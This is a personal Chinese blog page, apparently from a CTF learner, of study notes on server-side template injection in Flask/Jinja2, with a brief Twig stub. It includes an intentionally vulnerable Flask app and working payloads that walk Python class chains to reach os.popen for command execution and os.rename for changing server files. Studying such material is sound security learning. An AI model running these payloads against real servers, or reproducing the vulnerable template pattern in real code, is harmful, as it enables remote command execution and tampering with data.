@@ -1,0 +1,1303 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="SSTI学习记录, Atmujie">
+    <meta name="description" content="有一美人兮，见之不忘，一日不见兮，思之如狂；">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>SSTI学习记录 | Atmujie</title>
+    <link rel="icon" type="image/png" href="/weblogo.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Atmujie</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Atmujie</div>
+        <div class="logo-desc">
+            
+            有一美人兮，见之不忘，一日不见兮，思之如狂；
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">SSTI学习记录</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-06-08
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="SSTI基础"><a href="#SSTI基础" class="headerlink" title="SSTI基础"></a>SSTI基础</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>每个模板都是大致类似却各有区别的，上个模版注入的内容不一定适用于下一个模板，最有效的注入方法除了网上百度各大师傅的文章，就只有查阅帮助文档</p>
+<h2 id="简介与原理"><a href="#简介与原理" class="headerlink" title="简介与原理"></a>简介与原理</h2><p>我们在写项目时，为了方便且简单实现界面数据分离，业务逻辑分离，通常使用模板来实现</p>
+<p>模板定义了在前端调用后端数据的方法，最常见的就是</p>
+<p>当服务端没有对用户的输出进行处理时，一但用户输入了符合条件的命令，就会造成模板注入，这点几乎是所有注入所共通的地方</p>
+<p>我们称这个漏洞为SSTI，也叫沙盒逃逸</p>
+<h2 id="模板框架"><a href="#模板框架" class="headerlink" title="模板框架"></a>模板框架</h2><p><img src="https://p5.ssl.qhimg.com/t01f4792c7d03dd49cc.png" alt="img"></p>
+<h2 id="基本的测试方法："><a href="#基本的测试方法：" class="headerlink" title="基本的测试方法："></a>基本的测试方法：</h2><p><img src="http://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWctYmxvZy5jc2RuaW1nLmNuLzIwMjAwNTEyMTcyNDM1OTgxLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3dhdGVybWFyayx0eXBlX1ptRnVaM3BvWlc1bmFHVnBkR2ssc2hhZG93XzEwLHRleHRfYUhSMGNITTZMeTlpYkc5bkxtTnpaRzR1Ym1WMEwzRnhYelF4TmpJNE5qWTUsc2l6ZV8xNixjb2xvcl9GRkZGRkYsdF83MA?x-oss-process=image/format,png" alt="在这里插入图片描述"></p>
+<p>这里的绿线表示结果成功返回，红线反之。有些时候，同一个可执行的 payload 会在不同引擎中返回不同的结果，比方说7*’7’会在 Twig 中返回49，而在 Jinja2 中则是7777777。</p>
+<h1 id="FlaskSSti"><a href="#FlaskSSti" class="headerlink" title="FlaskSSti"></a>FlaskSSti</h1><p><strong>基于python的模板引擎</strong></p>
+<h3 id="内建函数"><a href="#内建函数" class="headerlink" title="内建函数"></a>内建函数</h3><p>在我们没有启动一个python解释器时，即使没有创建任何的变量和函数，仍然有很多函数可以调用，我们称之为内建函数</p>
+<p>内建函数并不需要我们自己做定义，而是在启动python解释器的时候，就已经导入到内存中供我们使用，想要了解这里面的工作原理，我们可以从名称空间开始。</p>
+<p>名称空间在python是个非常重要的概念，它是从名称到对象的映射，而在python程序的执行过程中，至少会存在两个名称空间</p>
+<blockquote>
+<p>内建名称空间：python自带的名字，在python解释器启动时产生，存放一些python内置的名字</p>
+<p>全局名称空间：在执行文件时，存放文件级别定义的名字</p>
+<p>局部名称空间（可能不存在）：在执行文件的过程中，如果调用了函数，则会产生该函数的名称空间，用来存放该函数内定义的名字，该名字在函数调用时生效，调用结束后失效</p>
+</blockquote>
+<pre><code>加载顺序：内置名称空间------&gt;全局名称空间-----&gt;局部名称空间
+名字的查找顺序：局部名称空间------&gt;全局名称空间-----&gt;内置名称空间
+</code></pre>
+<p>在python中运行dir()，我们可以看到这些内置的函数</p>
+<p><img src="image-20210608144616955.png" alt="image-20210608144616955"></p>
+<p>可以看到，str,zip,ascii都在其中</p>
+<h4 id="内建属性"><a href="#内建属性" class="headerlink" title="内建属性"></a>内建属性</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token number">1.</span>__class__ ：
+    __class__功能和type<span class="token punctuation">(</span><span class="token punctuation">)</span>函数一样，都是查看对象所在的类。
+    __class__可以套用
+    例如：<span class="token string">""</span><span class="token punctuation">.</span>__class__ <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'str'</span><span class="token operator">></span> 
+    或者 a <span class="token operator">=</span> <span class="token number">123</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>__class__<span class="token punctuation">)</span>    <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'int'</span><span class="token operator">></span>
+<span class="token number">2.</span>__bases__ <span class="token punctuation">:</span> 
+      __bases__属性可以获取对象的基类
+      该属性返回所有直接父类组成的元组。注意是直接父类！！！
+    使用语法：类名<span class="token punctuation">.</span>bases<span class="token punctuation">,</span>常配合__class__使用
+    例如：<span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__ <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span>
+    这里返回的便是str类的父类object<span class="token punctuation">,</span>object也是python所有函数的基类
+<span class="token number">3.</span>__mro__ <span class="token punctuation">:</span> 
+    __mro__属性获取整个类的继承关系，返回内容是一个列表
+    当使用__bases__无法获取基类object时，使用__mro__<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>即可得到基类object
+<span class="token number">4.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>
+    __subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>函数获取基于此父类下的所有子类
+    __subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>返回一个列表
+    例如：a<span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bool'</span><span class="token operator">></span>
+    这里返回了基于int类的所有子类，如果我们想得到object的子类，只需定位到该类即可
+    <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> 
+   
+这也是类继承的原理
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="image-20210608154150096.png" alt="image-20210608154150096"></p>
+<h3 id="类继承"><a href="#类继承" class="headerlink" title="类继承"></a>类继承</h3><p>python中对一个变量应用<strong>class</strong>方法从一个变量实例转到对应的对象类型后，类有以下三种关于继承关系的方法</p>
+<pre class="line-numbers language-python"><code class="language-python">__bases__ <span class="token operator">//</span>对象的一个基类，一般情况下是object，有时不是，这时需要使用下一个方法
+
+__mro__ <span class="token operator">//</span>同样可以获取对象的基类，只是这时会显示出整个继承链的关系，是一个列表，object在最底层故在列表中的最后，通过__mro__<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>可以获取到
+
+__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">//</span>继承此对象的子类，返回一个列表
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>有这些类继承的方法，我们就可以从任何一个变量，回溯到基类中去，再获得到此基类所有实现的类，就可以获得到很多的类啦。</p>
+<h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><h4 id="int-，-new-和-call"><a href="#int-，-new-和-call" class="headerlink" title="__int__，__new__和__call__"></a><code>__int__</code>，<code>__new__</code>和<code>__call__</code></h4><p>这三个魔术方法都是用来定义一个类，用得最多的就是 <code>__init__</code> 方法，而 <code>__new__</code> 和 <code>__call__</code> 使用得比较少</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token number">1.</span>__init__ ：
+    __init__方法负责对象的初始化
+    可以方便地自己对类的属性进行定义，__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>方法又被称为构造器
+    当实例对象创建完成后被调用，然后设置对象属性的一些初始值。
+<span class="token number">2.</span>__new__ <span class="token punctuation">:</span>
+    在实例创建之前被调用，它的任务就是创建实例然后返回该实例
+    是个静态方法。
+<span class="token number">3.</span>__call__ <span class="token punctuation">:</span>
+    将一个类实例变成一个可调用对象
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>在定位到基类的子类后，可以用这三个方法调用那个类</p>
+<h3 id="globals"><a href="#globals" class="headerlink" title="__globals__"></a><code>__globals__</code></h3><p>这个方法用于查找所有的方法及变量与参数</p>
+<h2 id="SSTI实现方法"><a href="#SSTI实现方法" class="headerlink" title="SSTI实现方法"></a>SSTI实现方法</h2><p>了解了上面这些内置函数和魔术函数，可能有些师傅已经明白SSTI的实现方法了</p>
+<p>这里以python 的莫模板注入为例，实际上所有的ssti原理都大致相通</p>
+<p>当我们实现一个操作时，即使这个操作非常的简单，python都是从一个基类开始向上进行类的调用，最终实现一个简单的操作</p>
+<p>python中所有类默认继承object类，而object类提供了了很多原始的内建属性和方法，所以用户自定义的类在Python中也会继承这些内建属性。</p>
+<p>这个上面已经提到</p>
+<p>当我们使用上述的内置属性和魔术方法定位至可以执行命令的类时，使用<code>__init__</code>将其调用，然后找到利用点，传入参数利用</p>
+<p>这样就实现了ssti模板注入的攻击</p>
+<h2 id="注入示例及分析"><a href="#注入示例及分析" class="headerlink" title="注入示例及分析"></a>注入示例及分析</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> request
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template_string
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    id <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span>
+    template <span class="token operator">=</span> <span class="token string">"&lt;h1>%s&lt;/h1>"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>id<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">True</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ul>
+<li><p>传入<code>&#39;&#39;.__class__</code></p>
+<p>  <img src="image-20210608165753261.png" alt="image-20210608165753261"></p>
+</li>
+<li><p>得到python基类</p>
+<p>  <code>?id=&#39;&#39;.__class__.__bases__</code></p>
+<p>  <img src="image-20210608170011223.png" alt="image-20210608170011223"></p>
+</li>
+<li><p>查看此程序所有使用的子类</p>
+<p>  <code>?id=&#39;&#39;.__class__.__bases__[0].__subclasses__()</code></p>
+<p>  <img src="image-20210608170317839.png" alt="image-20210608170317839"></p>
+</li>
+<li><p>找到可以执行命令的类</p>
+<p>  <code>?id=&#39;&#39;.__class__.__bases__[0].__subclasses__()[118]</code></p>
+<p>  <img src="image-20210608170647445.png" alt="image-20210608170647445"></p>
+</li>
+</ul>
+<h3 id="os库"><a href="#os库" class="headerlink" title="os库"></a>os库</h3><p>os 库用于操作和处理文件</p>
+<p>os库中提供了可以执行命令的函数</p>
+<p>例如：</p>
+<pre class="line-numbers language-python"><code class="language-python">os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token punctuation">)</span>
+os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h4 id="os-popen"><a href="#os-popen" class="headerlink" title="os.popen()"></a>os.popen()</h4><p>用法：os.popen(command[,mode[,bufsize]])</p>
+<p>说明：<strong>mode</strong> – 模式权限可以是 ‘r’(默认) 或 ‘w’。</p>
+<p>popen方法通过p.read()获取终端输出，而且popen需要关闭close().当执行成功时，close()不返回任何值，失败时，close()返回系统返回值（失败返回1）. 可见它获取返回值的方式和os.system不同。</p>
+<p><img src="image-20210608214104059.png" alt="image-20210608214104059"></p>
+<p>可以看到我们用read()可以把结果回显。</p>
+<pre class="line-numbers language-python"><code class="language-python">?id <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">118</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
+或者
+?id<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">118</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h4 id="os-system"><a href="#os-system" class="headerlink" title="os.system()"></a>os.system()</h4><p>用法：os.system(command)</p>
+<p>这个调用相当直接，且是同步进行的，程序需要<strong>阻塞</strong>并等待返回。返回值是依赖于系统的，直接返回系统的调用返回值。</p>
+<p>注意：该函数返回命令<strong>执行结果的返回值</strong>，并不是返回命令的执行输出（执行成功返回0，失败返回-1）</p>
+<p><img src="image-20210608214231963.png" alt="image-20210608214231963"></p>
+<h3 id="subprocess"><a href="#subprocess" class="headerlink" title="subprocess"></a>subprocess</h3><p>subprocess 模块有比较多的功能，subprocess模块被推荐用来替换一些老的模块和函数，如：os.system、os.spawn、os.popen等</p>
+<p>subprocess模块目的是<strong>启动一个新的进程并与之通信</strong>。这里只讲用来运行shell命令的两个常用方法。</p>
+<p><img src="image-20210608215903861.png" alt="image-20210608215903861"></p>
+<pre class="line-numbers language-python"><code class="language-python">?id<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">376</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="subprocess-call-“command”"><a href="#subprocess-call-“command”" class="headerlink" title="subprocess.call(“command”)"></a><strong>subprocess.call(“command”)</strong></h4><p>父进程等待子进程完成<br>返回退出信息(returncode，相当于Linux exit code)</p>
+<p>与os.system功能相似,也无执行结果的回显</p>
+<h4 id="subprocess-Popen-“command”"><a href="#subprocess-Popen-“command”" class="headerlink" title="subprocess.Popen(“command”)"></a><strong>subprocess.Popen(“command”)</strong></h4><p>说明：<code>class subprocess.Popen(args, bufsize=0, executable=None, stdin=None, stdout=None, stderr=None, preexec_fn=None, close_fds=False, shell=False, cwd=None, env=None, universal_newlines=False, startupinfo=None, creationflags=0)</code></p>
+<p>Popen非常强大，支持多种参数和模式，通过其构造函数可以看到支持很多参数。但Popen函数存在缺陷在于，<strong>它是一个阻塞的方法</strong>，如果运行cmd命令时产生内容非常多，函数就容易阻塞。另一点，<strong>Popen方法也不会打印出cmd的执行信息</strong>。</p>
+<h3 id="操作思路"><a href="#操作思路" class="headerlink" title="操作思路"></a>操作思路</h3><p>SSTI考验的对代码的熟悉，能快速找到可执行的代码，就可以实现我们的目地</p>
+<p>举个例子</p>
+<p>现在我们找到了所有的函数，假设我们知道文件的路径</p>
+<pre><code>D:\phpstudy_pro\WWW\ssti\ls.py
+</code></pre>
+<p><img src="image-20210609162844096.png" alt="image-20210609162844096"></p>
+<p>在os模块下，我们找到了rename函数，尝试调用它</p>
+<pre class="line-numbers language-python"><code class="language-python">?id<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">118</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'renames'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'D://phpstudy_pro//WWW//ssti//ls.py'</span><span class="token punctuation">,</span><span class="token string">'D://phpstudy_pro//WWW//ssti//测试一下修改成果.html'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="image-20210609162954488.png" alt="image-20210609162954488"></p>
+<p>成功</p>
+<p>所以SSTI的思路简单总结下来就是：</p>
+<ul>
+<li>找到注入点</li>
+<li>定位到任一父类</li>
+<li>找到基于当前父类，可以实现我们目的的子类</li>
+<li><code>__init__</code>调用此类，<code>__globals__</code>查找函数和方法</li>
+<li>调用函数或方法，执行我们想要执行的命令</li>
+</ul>
+<p>其中查看子类事往往有很多结果，甚至没有回显</p>
+<p>这时使用执行语句来查找，如上面的重命名就可以用命令执行：</p>
+<pre class="line-numbers language-python"><code class="language-python">?id<span class="token operator">=</span>
+<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span>
+<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">if</span> a<span class="token punctuation">.</span>__name__ <span class="token operator">==</span> <span class="token string">"_wrap_close"</span> <span class="token operator">%</span><span class="token punctuation">}</span>
+<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> a<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__ <span class="token operator">%</span><span class="token punctuation">}</span>
+<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token string">"renames"</span> <span class="token keyword">in</span> b <span class="token operator">%</span><span class="token punctuation">}</span>
+<span class="token punctuation">{</span><span class="token punctuation">{</span> a<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'rename'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'D://phpstudy_pro//WWW//ssti//1.py'</span><span class="token punctuation">,</span><span class="token string">'D://phpstudy_pro//WWW//ssti//2.py'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>
+<span class="token punctuation">{</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">}</span>
+<span class="token punctuation">{</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">}</span>
+<span class="token punctuation">{</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">}</span>
+<span class="token punctuation">{</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>最中间语句可以更简单，不过我不会写了</p>
+<p><img src="image-20210609170531704.png" alt="image-20210609170531704"></p>
+<p>修改成功</p>
+<h1 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h1><p><strong>基于PHP的模板引擎</strong></p>
+<h2 id="注入基础"><a href="#注入基础" class="headerlink" title="注入基础"></a>注入基础</h2><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><p>Twig模板定义了三个全局变量，这三个变量可在任意位置调用</p>
+<ul>
+<li><code>_self</code>: 引用当前模板；</li>
+<li><code>_context</code>: 引用当前上下文；</li>
+<li><code>_charset</code>: 引用当前字符集；</li>
+</ul>
+<p>注入，在Twig2后已弃用</p>
+<h1 id="特别鸣谢"><a href="#特别鸣谢" class="headerlink" title="特别鸣谢"></a>特别鸣谢</h1><p><strong><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/188172">https://www.anquanke.com/post/id/188172</a></strong></p>
+<p><strong><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3679/">https://xz.aliyun.com/t/3679/</a></strong></p>
+<p><strong><a target="_blank" rel="noopener" href="https://ysllz.github.io/2020/10/27/FlaskSSti/">https://ysllz.github.io/2020/10/27/FlaskSSti/</a></strong></p>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Atmujie</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
